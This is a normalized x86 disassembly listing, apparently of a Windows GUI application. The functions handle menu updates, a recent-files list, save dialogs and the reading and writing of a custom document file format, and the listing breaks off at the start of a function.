sub_4113e0
sub esp 0x64
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
add esp 0x64
retn
mov ecx rw-data
call sub_402620
cmp [ esi + 0xc ] 0x40
je r-xdata
push ebx
push ebp
push edi
mov ecx esi
call sub_40e4b0
mov ecx esi
call sub_40f190
mov ecx esi
call sub_4015b0
mov cl [ esi + 0xc ]
mov edi [ EnableMenuItem@IAT ]
xor eax eax
test cl cl
mov ecx [ rw-data ]
sete al
push eax
push 0x2713
push ecx
call edi
mov al [ esi + 0xc ]
xor edx edx
test al al
mov eax [ rw-data ]
sete dl
push edx
push 0x9c7a
push eax
call edi
mov ecx rw-data
call sub_424520
mov ecx esi
call sub_424c90
mov ecx [ rw-data ]
mov ebp [ rw-data ]
push 0x4
push ecx
call [ GetSubMenu@IAT ]
mov esi [ DeleteMenu@IAT ]
mov ebx eax
mov [ rw-data ] esi
push 0x400
push 0x4
push ebx
call esi
test eax eax
jne r-xdata
mov esi 0x5208
jmp r-xdata
mov edi [ ebp + 0x90 ]
push edi
call [ lstrlenA@IAT ]
test eax eax
je r-xdata
add eax edi
push eax
lea edx [ esi - 0x5207 ]
push edx
lea eax [ esp + 0x18 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
lea ecx [ esp + 0x10 ]
push ecx
push esi
push 0x0
push ebx
call [ AppendMenuA@IAT ]
mov ebp [ ebp ]
lea edx [ esi - 0x5208 ]
inc esi
cmp edx 0x8
je r-xdata
cmp [ edi + eax - 0x1 ] 0x5c
je r-xdata
mov eax [ rw-data ]
push eax
call [ DrawMenuBar@IAT ]
pop edi
pop ebp
pop ebx
cmp ebp [ rw-data ]
jne r-xdata
dec eax
jne r-xdata
sub_411520
push esi
mov esi ecx
mov eax [ esi + 0x90 ]
mov ecx [ rw-data ]
push eax
push 0x34
push 0x55
push 0x56
push ecx
call sub_420e20
add esp 0x14
cmp eax 0x6
jne r-xdata
pop esi
retn
mov edx [ esi + 0x90 ]
push edx
call [ DeleteFileA@IAT ]
mov ecx esi
pop esi
jmp sub_40ea70
sub_411560
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx ebx
call sub_419070
mov esi [ esi + 0x4c ]
test esi esi
je r-xdata
mov ecx ebx
call sub_401000
pop esi
pop ebx
retn 0x4
push edi
push 0xd
mov ecx ebx
call sub_419620
push 0xa
mov ecx ebx
call sub_419620
mov esi [ esi ]
test esi esi
jne r-xdata
mov eax [ esi + 0x10 ]
movzx ecx [ eax + edi * 2 ]
push ecx
mov ecx ebx
call sub_419620
mov eax [ esi + 0x18 ]
inc edi
cmp edi eax
jl r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
test eax eax
jle r-xdata
pop edi
sub_4115c0
push ebx
push ebp
mov ebx ecx
mov eax [ ebx + 0x50 ]
push esi
push eax
xor esi esi
xor ebp ebp
call sub_421980
test eax eax
je r-xdata
push edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x4
mov ecx [ esp + 0x14 ]
mov edi esi
call sub_4192e0
mov esi eax
cmp esi 0xfeff
je r-xdata
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
cmp edi 0xd
jne r-xdata
cmp edi 0xa
jne r-xdata
cmp esi 0xa
je r-xdata
test ebp ebp
je r-xdata
cmp esi 0xd
jne r-xdata
mov esi edi
jmp r-xdata
cmp esi 0xa
je r-xdata
mov ecx [ ebx + 0x50 ]
push ecx
mov ecx ebx
xor ebp ebp
call sub_421980
test eax eax
jne r-xdata
mov ebp 0x1
jmp r-xdata
cmp esi 0xd
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
retn 0x4
mov ecx [ ebx + 0x50 ]
push esi
call sub_421a80
jmp r-xdata
sub_411660
sub esp 0x204
push esi
mov esi [ esp + 0x20c ]
push edi
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0x40000000
push esi
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
mov ebx [ WriteFile@IAT ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x4
push rw-data
push edi
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push 0x200
call [ GetCurrentDirectoryA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call [ lstrlenA@IAT ]
inc eax
push eax
lea ecx [ esp + 0x1c ]
push ecx
push edi
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x5b
push 0x1
call sub_421530
add esp 0xc
pop edi
mov eax 0x1
pop esi
add esp 0x204
retn 0x4
push edi
call [ CloseHandle@IAT ]
pop ebx
pop edi
xor eax eax
pop esi
add esp 0x204
retn 0x4
push ebp
mov ebp [ eax ]
lea esp [ esp ]
cmp ebp eax
je r-xdata
push 0x0
lea edx [ esp + 0x14 ]
push edx
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
push esi
push edi
call ebx
mov eax [ rw-data ]
pop ebp
mov ebp [ ebp ]
jmp r-xdata
mov cl [ ebp + 0xc ]
test cl cl
mov esi [ ebp + 0x90 ]
je r-xdata
sub_411750
sub esp 0xdc
push esi
mov esi ecx
mov ecx [ esp + 0xe4 ]
push 0x80
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x10 ] esi
call sub_401380
test eax eax
je r-xdata
push ebx
push ebp
xor edx edx
push edi
mov [ esp + 0x10 ] edx
mov ebp rw-data
mov eax 0x1
pop esi
add esp 0xdc
retn 0x4
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp edx 0x3
mov [ esp + 0x10 ] edx
je r-xdata
add ebp 0x6
inc edx
cmp ebp rw-data
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ edi + 0x1 ]
jne r-xdata
mov edx [ esi + 0x90 ]
push edx
push 0x5c
push 0x1
call sub_421530
add esp 0xc
cmp [ esp + 0x4c ] 0x42022667
jne r-xdata
mov edi ebp
lea eax [ esp + 0x50 ]
lea ebx [ ebx ]
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x58 ]
mov [ esi + 0x94 ] ecx
mov ecx [ esp + 0x60 ]
mov [ esi + 0x9c ] ecx
mov [ esi + 0x98 ] eax
mov eax [ esp + 0x64 ]
mov [ esi + 0xa0 ] eax
mov al [ esp + 0x68 ]
mov cl al
shr cl 0x5
and cl 0x1
mov [ esi + 0xa4 ] cl
mov cl al
and cl 0x1
mov [ esi + 0xa5 ] cl
mov cl al
shr cl 0x3
and cl 0x1
mov [ esi + 0xa9 ] cl
mov cl al
shr cl 0x4
and cl 0x1
test al 0x2
mov [ esi + 0xa8 ] cl
je r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ edi ]
jne r-xdata
test al 0x4
mov ebx [ esp + 0xf0 ]
je r-xdata
xor edi edi
lea ebx [ esi + 0xac ]
xor edi edi
cmp [ esp + 0x69 ] di
jle r-xdata
xor ebp ebp
add esi 0xc0
lea esp [ esp ]
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
add esp 0xdc
retn 0x4
inc edi
add ebx 0x4
cmp edi 0x5
jl r-xdata
cmp [ esp + 0x56 ] 0x0
mov [ esp + 0x14 ] 0x0
jle r-xdata
push 0x1a
lea ecx [ esp + 0x34 ]
push ecx
mov ecx ebx
call sub_401380
test eax eax
jne r-xdata
inc edi
add ebx 0x4
cmp edi 0x3
jl r-xdata
mov edx [ esp + 0xf0 ]
push edx
mov ecx ebx
call sub_4204e0
test eax eax
jne r-xdata
mov al [ esp + 0x68 ]
mov edx [ esp + 0x10 ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0xdc
retn 0x4
mov ebp 0x64
jmp r-xdata
cmp [ esp + 0x3c ] 0x1
jl r-xdata
mov eax [ esp + 0xf0 ]
push eax
mov ecx ebx
call sub_4204e0
test eax eax
jne r-xdata
inc ebp
add esi 0xc
cmp ebp 0x4
jl r-xdata
test edx edx
jl r-xdata
mov eax [ esp + 0x42 ]
test eax eax
je r-xdata
push 0x20
lea edx [ esp + 0xd0 ]
push edx
mov ecx ebx
call sub_401380
test eax eax
jne r-xdata
xor edi edi
mov ebx esi
mov esi [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0xf0 ]
mov ecx [ esi + 0x50 ]
push ecx
mov ecx esi
call sub_421980
test eax eax
jne r-xdata
cmp edx 0x1
jle r-xdata
mov edx [ esp + 0x10 ]
movsx eax [ esp + 0x69 ]
inc edi
cmp edi eax
jl r-xdata
mov esi ebx
call sub_4112c0
test eax eax
je r-xdata
mov edx [ esi + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov edx [ esi + 0x50 ]
mov al [ esp + 0x1c ]
mov [ edx + 0x21 ] al
mov ecx [ esi + 0x50 ]
mov dl [ esp + 0x1d ]
mov [ ecx + 0x1f ] dl
mov eax [ esi + 0x50 ]
mov cl [ esp + 0x1e ]
mov [ eax + 0x20 ] cl
mov edx [ esi + 0x50 ]
mov ax [ esp + 0x1a ]
mov [ edx + 0x1c ] ax
movsx ecx [ esp + 0x18 ]
mov edx [ esi + 0x50 ]
dec ecx
mov [ edx + 0x18 ] ecx
movsx eax [ esp + 0x18 ]
mov ecx [ esi + 0x50 ]
mov edx [ ecx + 0x8 ]
dec eax
mov [ edx + 0x4 ] eax
test [ esp + 0x20 ] 0x1
je r-xdata
push 0x10
lea eax [ esp + 0x1c ]
push eax
mov ecx ebx
call sub_401380
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ esp + 0xe4 ]
test eax eax
jne r-xdata
mov ax [ esp + 0x18 ]
mov ecx [ esi + 0x50 ]
mov edi [ ecx + 0x14 ]
movsx edx ax
cmp edi edx
jge r-xdata
mov eax [ esi + 0x50 ]
mov [ eax + 0x1e ] 0x1
pop edi
pop ebp
pop ebx
mov eax 0x2
pop esi
add esp 0xdc
retn 0x4
push 0x8
lea ecx [ esp + 0x2c ]
push ecx
mov ecx ebx
call sub_401380
test eax eax
jne r-xdata
mov esi [ esp + 0x14 ]
xor edi edi
test ax ax
jle r-xdata
mov ecx [ esi + 0x50 ]
call sub_421770
test eax eax
jne r-xdata
mov al [ esp + 0x2a ]
mov dx [ esp + 0x28 ]
mov cl [ esp + 0x2c ]
mov [ esp + 0x1c ] al
mov al [ esp + 0x20 ]
mov [ esp + 0x18 ] dx
mov dl [ esp + 0x2e ]
and al 0xfe
mov [ esp + 0x1d ] cl
mov [ esp + 0x1e ] dl
mov [ esp + 0x1a ] bp
mov [ esp + 0x20 ] al
jmp r-xdata
mov eax [ esp + 0x14 ]
movsx ecx [ esp + 0x56 ]
inc eax
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
mov edi edi
mov eax [ esi + 0x50 ]
pop edi
pop ebp
pop ebx
mov [ eax + 0x18 ] 0x0
mov eax 0x2
pop esi
add esp 0xdc
retn 0x4
mov ax [ esp + 0x18 ]
mov ecx [ esi + 0x50 ]
mov edi [ ecx + 0x14 ]
movsx edx ax
cmp edi edx
jl r-xdata
mov edx [ esp + 0x10 ]
nop
mov ecx [ esi + 0x50 ]
mov [ ecx + 0x18 ] edi
pop edi
pop ebp
pop ebx
mov eax 0x2
pop esi
add esp 0xdc
retn 0x4
test bl bl
jns r-xdata
test ebx ebx
jne r-xdata
mov ecx [ esp + 0xf0 ]
call sub_4013f0
shl ebx 0x8
or eax ebx
and eax 0x7f7f
mov ebx eax
jmp r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ eax + 0x10 ]
mov [ ecx + edi * 2 ] bx
movsx edx [ esp + 0x18 ]
mov ebx [ esp + 0xf0 ]
inc edi
cmp edi edx
jl r-xdata
mov ecx [ esp + 0xf0 ]
call sub_4013f0
mov ebx eax
or ebx 0x80
mov ecx ebx
call sub_4013f0
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_411b80
sub esp 0x94
push ebx
push ebp
mov ebx ecx
push esi
push edi
xor eax eax
mov ecx 0x20
lea edi [ esp + 0x24 ]
[ edi ]
mov eax [ ebx + 0x4c ]
xor ecx ecx
test eax eax
je r-xdata
mov [ esp + 0x2e ] cx
mov [ esp + 0x24 ] 0x42022667
xor eax eax
jmp r-xdata
mov eax [ eax ]
inc ecx
test eax eax
jne r-xdata
mov cl [ eax + rw-data ]
mov [ esp + eax + 0x28 ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ ebx + 0x94 ]
mov ecx [ ebx + 0x98 ]
mov edx [ ebx + 0x9c ]
mov [ esp + 0x30 ] eax
mov eax [ ebx + 0xa0 ]
mov [ esp + 0x3c ] eax
mov al [ ebx + 0xa4 ]
and al 0x1
mov [ esp + 0x34 ] ecx
mov cl [ ebx + 0xa8 ]
shl al 0x1
and cl 0x1
or al cl
mov cl [ ebx + 0xa5 ]
mov [ esp + 0x38 ] edx
mov dl [ ebx + 0xa9 ]
shl al 0x1
and dl 0x1
or al dl
mov dl [ esp + 0x40 ]
shl al 0x3
and cl 0x1
or al cl
mov ecx [ ebx + 0xac ]
and dl 0xc6
lea esi [ ebx + 0xac ]
or al dl
test ecx ecx
mov [ esp + 0x40 ] al
je r-xdata
mov ecx [ ebx + 0xb0 ]
test ecx ecx
je r-xdata
or al 0x2
mov [ esp + 0x40 ] al
mov ecx [ ebx + 0xb4 ]
test ecx ecx
je r-xdata
or al 0x2
mov [ esp + 0x40 ] al
mov ecx [ ebx + 0xb8 ]
test ecx ecx
je r-xdata
or al 0x2
mov [ esp + 0x40 ] al
mov ecx [ ebx + 0xbc ]
test ecx ecx
je r-xdata
or al 0x2
mov [ esp + 0x40 ] al
lea ecx [ ebx + 0xc4 ]
mov edx 0x4
or al 0x2
mov [ esp + 0x40 ] al
cmp [ ecx ] 0x0
je r-xdata
or al 0x4
mov edi [ ecx + 0x4 ]
test edi edi
je r-xdata
or al 0x4
add ecx 0xc
dec edx
jne r-xdata
or al 0x4
mov edi [ ecx - 0x4 ]
test edi edi
je r-xdata
mov ebp [ esp + 0xa8 ]
mov [ esp + 0x40 ] al
push 0x80
lea eax [ esp + 0x28 ]
push eax
mov ecx ebp
call sub_4011e0
test [ esp + 0x40 ] 0x2
je r-xdata
test [ esp + 0x40 ] 0x4
je r-xdata
mov edi 0x5
lea esp [ esp ]
mov edi [ ebx + 0x4c ]
xor ecx ecx
test edi edi
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
je r-xdata
lea esi [ ebx + 0xc0 ]
mov [ esp + 0x10 ] 0x4
push ebp
mov ecx esi
call sub_4205d0
add esi 0x4
dec edi
jne r-xdata
mov ecx ebp
call sub_401000
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn 0x4
lea esp [ esp ]
push ebp
mov ecx esi
call sub_4205d0
add esi 0x4
dec edi
jne r-xdata
dec [ esp + 0x10 ]
jne r-xdata
push 0xa
mov ecx ebp
call sub_401240
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ edi + 0x10 ]
mov bx [ eax + esi * 2 ]
test bh 0x7f
je r-xdata
mov edi 0x3
mov dx [ edi + 0x18 ]
inc dx
mov [ esp + 0x14 ] dx
mov ax [ edi + 0x1c ]
mov [ esp + 0x16 ] ax
mov cl [ edi + 0x21 ]
mov [ esp + 0x18 ] cl
mov dl [ edi + 0x1f ]
mov [ esp + 0x19 ] dl
mov al [ edi + 0x20 ]
mov [ esp + 0x1a ] al
mov cl [ edi + 0x1e ]
mov al [ esp + 0x1c ]
xor cl al
and cl 0x1
xor al cl
push 0x10
lea edx [ esp + 0x18 ]
push edx
mov ecx ebp
mov [ esp + 0x24 ] al
call sub_4011e0
mov eax [ edi + 0x18 ]
xor esi esi
test eax eax
mov [ esp + 0x10 ] esi
jle r-xdata
test bl bl
js r-xdata
movzx esi bx
mov ecx esi
or ecx 0x8000
shr ecx 0x8
push ecx
mov ecx ebp
call sub_401240
and esi 0x7f
or esi 0x80
push esi
mov ecx ebp
call sub_401240
mov esi [ esp + 0x10 ]
jmp r-xdata
push 0x0
mov ecx ebp
call sub_401240
and ebx 0x7f
push ebx
test bx bx
je r-xdata
mov eax [ edi + 0x18 ]
inc esi
cmp esi eax
mov [ esp + 0x10 ] esi
jl r-xdata
movzx edx bx
push edx
jmp r-xdata
mov ecx ebp
call sub_401240
sub_411e30
mov eax [ esp + 0x8 ]
sub eax 0x53
push esi
je r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x8 ]
push edx
push eax
call sub_414bc0
add esp 0x8
sub eax 0xbd
je r-xdata
mov esi [ rw-data ]
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
push edi
mov edi [ esp + 0x10 ]
dec eax
jne r-xdata
mov ecx [ esi + 0x90 ]
push ecx
push 0x0
push 0x180
push 0x708
push edi
call ebx
mov esi [ esi ]
cmp esi [ rw-data ]
jne r-xdata
push 0x0
push 0x0
push 0x186
push 0x708
push edi
call ebx
pop edi
pop ebx
mov eax 0x1
pop esi
retn 0x10
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0x10 ]
movzx eax cx
dec eax
je r-xdata
mov esi [ esp + 0x8 ]
push 0x0
push 0x0
push 0x188
push 0x708
push esi
call [ SendDlgItemMessageA@IAT ]
inc eax
push eax
push esi
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
retn 0x10
dec eax
je r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push eax
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
retn 0x10
sub eax 0x706
je r-xdata
shr ecx 0x10
cmp ecx 0x2
jne r-xdata
mov eax 0x1
pop esi
retn 0x10
sub_411f20
mov ecx [ esp + 0x8 ]
test ecx ecx
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
jne r-xdata
cmp ecx 0x1
mov eax [ rw-data ]
jle r-xdata
push ecx
mov ecx [ esp + 0x8 ]
push sub_411e30
push ecx
push 0x38c
call sub_420d20
mov ecx eax
add esp 0x10
test ecx ecx
jne r-xdata
retn
dec ecx
jmp r-xdata
retn
dec ecx
mov eax [ eax ]
jne r-xdata
sub_411fa0
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
push edi
mov edi [ esp + 0xc ]
xor eax eax
pop esi
retn
pop edi
mov eax esi
pop esi
retn
mov esi [ esi ]
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x90 ]
push eax
push edi
call sub_431aa6
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_411fe0
sub esp 0xa20
push esi
mov esi [ esp + 0xa28 ]
test esi esi
push edi
mov edi ecx
jne r-xdata
mov eax [ edi + 0x90 ]
test eax eax
je r-xdata
mov al [ edi + 0xc ]
test al al
je r-xdata
push esi
call sub_431a26
add esp 0x4
mov ecx edi
mov [ edi + 0x90 ] eax
call sub_40e4b0
push eax
call sub_429931
add esp 0x4
mov ecx edi
call sub_4121d0
pop edi
pop esi
add esp 0xa20
retn 0x4
mov esi [ edi + 0x90 ]
jmp r-xdata
mov al [ edi + 0xc ]
cmp al 0x4
je r-xdata
push esi
push 0x5e
push 0x1
call sub_421530
add esp 0xc
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
add esp 0xa20
retn 0x4
push ebx
push ebp
push esi
call sub_4112f0
mov ebp [ lstrcpyA@IAT ]
add esp 0x4
push esi
lea eax [ esp + 0x64 ]
push eax
call ebp
push r--data
lea ecx [ esp + 0x64 ]
push ecx
call [ lstrcatA@IAT ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0x40000000
lea edx [ esp + 0x78 ]
push edx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push ebx
push 0x7d0
lea eax [ esp + 0x268 ]
push eax
lea ecx [ esp + 0x4c ]
call sub_4011b0
lea ecx [ esp + 0x40 ]
push ecx
mov ecx edi
call sub_411b80
cmp al 0x5
je r-xdata
mov ecx edi
mov [ edi + 0x48 ] 0x0
call sub_40e4b0
mov ecx rw-data
call sub_424520
mov al [ rw-data ]
test al al
mov ebx [ DeleteFileA@IAT ]
je r-xdata
lea edx [ esp + 0x60 ]
push edx
call [ DeleteFileA@IAT ]
push esi
push 0x5f
push 0x1
call sub_421530
add esp 0xc
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
add esp 0xa20
retn 0x4
push ebx
push 0x7d0
lea eax [ esp + 0x268 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_4011b0
movzx ecx [ edi + 0xc ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_419030
lea edx [ esp + 0x14 ]
push edx
mov ecx edi
call sub_411560
jmp r-xdata
push esi
call ebx
push esi
lea eax [ esp + 0x64 ]
push eax
call [ MoveFileA@IAT ]
pop ebp
pop ebx
pop edi
xor eax eax
pop esi
add esp 0xa20
retn 0x4
push esi
lea eax [ esp + 0x64 ]
push eax
call ebp
mov edi [ lstrcatA@IAT ]
push r--data
lea ecx [ esp + 0x64 ]
push ecx
call edi
lea edx [ esp + 0x60 ]
push edx
call ebx
lea eax [ esp + 0x60 ]
push eax
push esi
call [ MoveFileA@IAT ]
push esi
lea ecx [ esp + 0x64 ]
push ecx
call ebp
push r--data
lea edx [ esp + 0x64 ]
push edx
call edi
push ebx
mov [ esp + 0x14 ] eax
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_4121d0
sub esp 0x24c
push ebp
mov ebp ecx
mov al [ ebp + 0xc ]
test al al
push esi
push edi
je r-xdata
mov esi 0x1
cmp al 0x3
je r-xdata
mov [ esp + 0x58 ] 0x0
mov eax [ ebp + 0x90 ]
push eax
lea ecx [ esp + 0x5c ]
push ecx
call [ lstrcpyA@IAT ]
jmp r-xdata
movzx esi al
sub esi 0x3
jmp r-xdata
mov cl [ esp + eax + 0x58 ]
cmp cl 0x2e
lea eax [ esp + eax + 0x58 ]
jne r-xdata
lea esp [ esp ]
mov edi [ lstrlenA@IAT ]
lea edx [ esp + 0x58 ]
push edx
call edi
dec eax
test eax eax
jle r-xdata
xor eax eax
mov ecx 0x13
lea edi [ esp + 0xc ]
[ edi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x61
mov [ esp + 0x14 ] 0x4c
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
call sub_420f10
mov [ esp + 0x20 ] eax
mov al [ ebp + 0xc ]
add esp 0x8
test al al
lea edx [ esp + 0x58 ]
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] 0x200
mov [ esp + 0x40 ] 0x804
je r-xdata
lea eax [ esp + 0xc ]
push eax
call [ GetSaveFileNameA@IAT ]
test eax eax
je r-xdata
mov [ eax ] 0x0
cmp cl 0x2f
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x24c
retn
lea ecx [ esp + 0x58 ]
push ecx
call edi
test eax eax
jle r-xdata
cmp cl 0x3a
je r-xdata
cmp [ esp + eax + 0x58 ] 0x2e
mov esi [ lstrcatA@IAT ]
je r-xdata
mov cl [ esp + eax + 0x58 ]
cmp cl 0x5c
je r-xdata
dec eax
test eax eax
jg r-xdata
lea ecx [ esp + 0x58 ]
push ecx
call edi
lea edx [ esp + 0x58 ]
mov cl [ eax + edx - 0x1 ]
dec edx
cmp cl 0x2e
jne r-xdata
mov eax [ esp + 0x24 ]
lea edx [ eax + eax * 4 + r--data ]
push edx
lea eax [ esp + 0x5c ]
push eax
call esi
cmp cl 0x2e
je r-xdata
mov cl [ esp + eax + 0x58 ]
cmp cl 0x2e
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
lea edx [ esp + 0x70 ]
push edx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x24 ]
lea eax [ eax + eax * 4 + r--data ]
push eax
lea ecx [ esp + 0x5c ]
push ecx
call esi
dec eax
test eax eax
jg r-xdata
push ebx
mov ebx [ esp + 0x28 ]
add ebx 0x3
cmp ebx 0xf
jne r-xdata
push eax
call [ CloseHandle@IAT ]
lea eax [ esp + 0x58 ]
push eax
push 0x60
call sub_420f70
add esp 0x8
test eax eax
jne r-xdata
mov ecx ebp
call sub_424fa0
lea edx [ esp + 0x5c ]
push edx
mov ecx ebp
mov [ ebp + 0xc ] bl
call sub_411fe0
pop ebx
pop edi
pop esi
pop ebp
add esp 0x24c
retn
lea ecx [ esp + 0x5c ]
push ecx
mov ecx ebp
call sub_411660
pop ebx
pop edi
pop esi
pop ebp
add esp 0x24c
retn
sub_4123c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431ceb
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov al [ esi + 0x48 ]
test al al
push edi
je r-xdata
mov eax [ esi ]
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
push 0x808
push eax
push 0x38f
push 0x0
call sub_4214f0
add esp 0x10
dec eax
je r-xdata
mov edi [ esi + 0x4 ]
xor edi edi
jmp r-xdata
push 0x0
mov ecx esi
call sub_411fe0
test eax eax
jne r-xdata
dec eax
jne r-xdata
mov ecx [ rw-data ]
call sub_4113e0
mov ecx [ esp + 0x8 ]
pop edi
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
mov eax [ esi ]
mov [ edx ] eax
mov ecx esi
mov [ rw-data ] edi
call sub_40e960
push esi
call j_sub_429931
add esp 0x4
test edi edi
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0xc
retn 0x4
mov edx [ rw-data ]
push edx
mov al [ rw-data ]
test al al
je r-xdata
mov ecx rw-data
call sub_425f60
push 0x53
call sub_420f70
add esp 0x4
test eax eax
jne r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
mov [ esp + 0x10 ] edi
je r-xdata
xor eax eax
push 0x1
push edi
push edi
mov ecx eax
call sub_4126f0
jmp r-xdata
push 0x54
push 0x1
call sub_421530
mov ecx [ rw-data ]
add esp 0x8
push ecx
jmp r-xdata
test eax eax
mov [ esp + 0x10 ] 0xffffffff
jne r-xdata
call [ DestroyWindow@IAT ]
sub_412500
push 0xffffffff
push sub_431d0e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x53c
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
push 0x23
push 0x57
mov esi ecx
push 0x58
push eax
mov [ esp + 0x20 ] esi
call sub_420e20
add esp 0x10
sub eax 0x2
je r-xdata
mov ecx esi
sub eax 0x4
jne r-xdata
mov edi [ esp + 0x55c ]
push edi
call sub_4112f0
add esp 0x4
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ esi ]
cmp ecx esi
je r-xdata
mov ebx [ ReadFile@IAT ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x530
lea edx [ esp + 0x28 ]
push edx
push esi
call ebx
test eax eax
je r-xdata
push edi
push 0x59
push 0x1
call sub_421530
add esp 0xc
jmp r-xdata
lea ecx [ ecx ]
push edi
push 0x5a
push 0x1
call sub_421530
add esp 0xc
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ esp + 0x1c ] 0xbe72c536
jne r-xdata
mov ecx [ esp + 0x54c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x548
retn 0x4
push 0x0
call sub_4123c0
mov ecx [ esi ]
cmp ecx esi
jne r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebp eax
lea eax [ ebp + 0x18 ]
push 0x1
push eax
call sub_429969
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push eax
push ebp
push edi
push esi
call ebx
push esi
call [ CloseHandle@IAT ]
cmp [ edi ] 0x0
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
jmp r-xdata
mov ebx [ lstrlenA@IAT ]
push edi
call ebx
lea esi [ eax + edi + 0x1 ]
cmp [ esi ] 0x0
je r-xdata
push edi
call [ SetCurrentDirectoryA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
mov ecx rw-data
call sub_425d10
push edi
call sub_429931
mov ecx [ esp + 0x14 ]
add esp 0x4
jmp r-xdata
jmp r-xdata
push 0x0
call sub_4123c0
push esi
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
push esi
call ebx
lea esi [ esi + eax + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
mov [ esp + 0x554 ] 0x0
je r-xdata
mov [ esp + 0x554 ] 0xffffffff
push 0x0
push 0x1
push esi
mov ecx eax
call sub_4126f0
sub_4126f0
push 0xffffffff
push sub_431d56
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x858
push ebx
push ebp
push esi
push edi
push j_sub_420470
push sub_401590
mov ebp ecx
push 0x5
push 0x4
